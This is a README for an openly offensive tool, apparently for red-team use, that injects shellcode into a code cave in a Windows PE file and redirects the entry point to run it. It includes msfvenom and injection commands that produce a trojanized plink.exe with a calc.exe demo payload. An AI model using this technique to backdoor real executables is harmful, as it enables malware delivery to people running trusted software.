# tapeworm - shellcode injector

Tapeworm injects your shellcode into the code cave at the end of the `.text` section of your PE file.

## Installation

Just install the dependencies:

```bash
pip install -r requirements.txt
```

## Usage

```
usage: ./tapeworm.py [-h] -p PAYLOAD -i INPUT -o OUTPUT [options...]

options:
  -h, --help            show this help message and exit
  -t, --use-create-thread
                        Run the shellcode in a new thread. Tapeworm will inject an
                        additional shellcode that will run CreateThread. The created
                        thread will run your shellcode immediately
  -a INJECTION_ADDRESS, --injection-address INJECTION_ADDRESS
                        RVA where the jump to the shellcode should be injected. 
                        If not specified the entry point of the PE will be used.
  -e EXTEND_CAVE, --extend-cave EXTEND_CAVE
                        Move the code cave start address EXTEND_CAVE bytes back.
                        This will result in EXTEND_CAVE last bytes of instructions in .text to be overwritten!
                        You may want to try this if the code cave is too small for your shellcode,
                        but it will make the main program break at some unexpected point.

required named arguments:
  -p PAYLOAD, --payload PAYLOAD
                        shellcode file
  -i INPUT, --input INPUT
                        input PE path
  -o OUTPUT, --output OUTPUT
                        output PE path
```

Example:

```bash
msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -o payload.bin
python tapeworm.py \
  -p payload.bin \
  -i plink.exe \
  -o injected_plink.exe \
  --use-create-thread
```

Sometimes injecting the `jmp <your-shellcode>` instruction at PE's entry point will crash the app if, for example, one of the replaced instructions contains a relocation (tapeworm won't edit them). In that case, run your favorite debugger, find some safe address to inject `jmp` to and pass it via `--injection-address`:

```bash
python tapeworm.py \
  -p payload.bin \
  -i plink.exe \
  -o injected_plink.exe \
  --injection-address 4d00
```

## What does it do?

It tries to inject your shellcode into the code cave at the end of the `.text` section.

Then it alters a few first instructions of your PE's entry point (or the instructions at the address passed via the `--injection-address` switch) to jump to the shellcode.

After the shellcode is executed registers and flags are restored, altered instructions are executed and then it jumps back to right after the entry point to continue program execution.

If you pass `--use-create-thread`, your shellcode will be ran in a new thread. Tapeworm will inject additional shellcode that runs `CreateThread`.

**NOTE**: The 32-bit asm code that calls `CreateThread` is based on the code from [this blog post by Ilia Dafchev](https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html). The 64-bit version is based on the code [this blog post by Nytro Security](https://nytrosecurity.com/2019/06/30/writing-shellcodes-for-windows-x64/).